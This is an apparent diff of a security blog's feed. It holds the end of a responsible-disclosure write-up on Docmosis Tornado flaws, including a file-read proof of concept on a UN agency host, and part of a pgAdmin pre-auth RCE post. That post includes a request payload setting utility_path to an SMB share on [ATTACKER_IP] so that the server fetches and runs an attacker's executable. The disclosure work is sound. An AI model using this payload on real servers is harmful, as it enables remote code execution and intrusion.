+&lt;p&gt;These findings were shared with the vendor and they released &lt;strong&gt;&lt;a href=&quot;https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes&quot;&gt;version 2.9.5&lt;/a&gt;&lt;/strong&gt; to address these issues (I did not validate the patches, though). Checking the exposure rate of this software on the public Internet, one of the systems found was &lt;strong&gt;[REDACTED].upu.int&lt;/strong&gt;. Even though, this instance was not using the latest version, the same vulnerabilities still worked fine.&lt;/p&gt;
+
+&lt;p&gt;As it turned out, this system belongs to the &lt;strong&gt;&lt;a href=&quot;https://www.upu.int/en/home&quot;&gt;Universal Postal Union (UPU)&lt;/a&gt;&lt;/strong&gt;, a specialized agency of the United Nations (UN). Additionally, this system seemed to be part of the official UPU network, i.e. no cloud-hosted instance but rather an entry point to the network of UPU.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/weltpost7_2.png&quot; alt=&quot;whois&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The system exposed a web UI of Docmosis Tornado with default configurations, i.e. no authentication needed at all. Even if authentication would have been needed, we already found an &lt;strong&gt;Authentication Bypass&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/weltpost4_2.png&quot; alt=&quot;exposure&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To prove the system to be vulnerable, we read the content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\win.ini&lt;/code&gt; and provided the report as quickly as possible.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/docmosis/weltpost6_2.png&quot; alt=&quot;poc&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;acknowledgements&quot;&gt;Acknowledgements&lt;/h2&gt;
+
+&lt;p&gt;Many thanks to &lt;a href=&quot;https://twitter.com/f00bar_&quot;&gt;Carlos&lt;/a&gt; from &lt;a href=&quot;https://www.unicc.org/&quot;&gt;UNICC&lt;/a&gt; to forward my requests to UPU quickly. Also the Docmosis team communicated fast and professionally.&lt;/p&gt;
+
+&lt;p&gt;P.S.: I’m pretty sure there’re more vulnerabilities in this product. Go, practice and responsibly disclose issues to the Docmosis team. Maybe you’ll find a deserialization vulnerability somewhere &lt;em&gt;*hint*&lt;/em&gt;.&lt;/p&gt;</content><author><name></name></author><category term="vulns4free" /><summary type="html">Recently, I did a non-exhaustive security product review on a Document Generator Engine, named Docmosis. A system I targeted used Docmosis Tornado in its latest version 2.9.4. I’ll give you a walkthrough based on my local lab installation with a Proof-of-Concept exploitation on an on-premises system belonging to a specialized agency of the United Nations.</summary></entry><entry><title type="html">Pre-Auth RCE with CodeQL in Under 20 Minutes</title><link href="http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes.html" rel="alternate" type="text/html" title="Pre-Auth RCE with CodeQL in Under 20 Minutes" /><published>2022-12-02T09:00:00+01:00</published><updated>2022-12-02T09:00:00+01:00</updated><id>http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes</id><content type="html" xml:base="http://localhost:4000/vulns4free/2022/12/02/rce-in-20-minutes.html">&lt;p&gt;This write-up won’t be an intense discussion on security code review techniques this time.
 We’ll simply let do all the hard work by a third party: &lt;a href=&quot;https://codeql.github.com/&quot;&gt;CodeQL&lt;/a&gt;.&lt;/p&gt;
 
 &lt;p&gt;Our target? &lt;a href=&quot;https://www.pgadmin.org/&quot;&gt;pgAdmin&lt;/a&gt;. Or to be more precise, the &lt;strong&gt;web interface&lt;/strong&gt; if you run pgAdmin in &lt;em&gt;server mode&lt;/em&gt;. For the ones of you who don’t know pgAdmin yet, have a look at their website.&lt;/p&gt;
@@ -144,7 +339,7 @@ Connection: close
 Referer: https://[TARGETHOST]/browser/
 Content-Length: [n]
 Content-Type: application/json
-{&quot;`utility_path&quot;:&quot;\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]&quot;}
+{&quot;utility_path&quot;:&quot;\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]&quot;}
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;After firing the payload, we see an incoming SMB connection at our attacker machine, retrieving the file(s) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pg_dump.exe&lt;/code&gt;: Pre-Auth RCE achieved.&lt;/p&gt;
